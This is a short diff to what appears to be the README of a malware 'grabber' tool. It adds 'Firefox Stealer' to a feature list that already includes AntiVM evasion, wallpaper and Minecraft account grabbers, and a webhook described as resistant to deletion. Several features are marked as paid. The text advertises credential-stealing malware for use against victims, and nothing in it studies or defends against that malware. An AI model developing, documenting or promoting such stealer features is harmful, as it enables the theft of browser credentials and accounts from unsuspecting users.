@@ -39,6 +39,7 @@ It Works With An API So Your Webhook won't be deleted. <br>
 - AntiVM (💎)
 - PC Wallpaper Grabber (💎)
 - Minecraft Grabber (💎)
+- Firefox Stealer (💎)
 
 ## <a id="salepute"></a> Free Version Installation
 
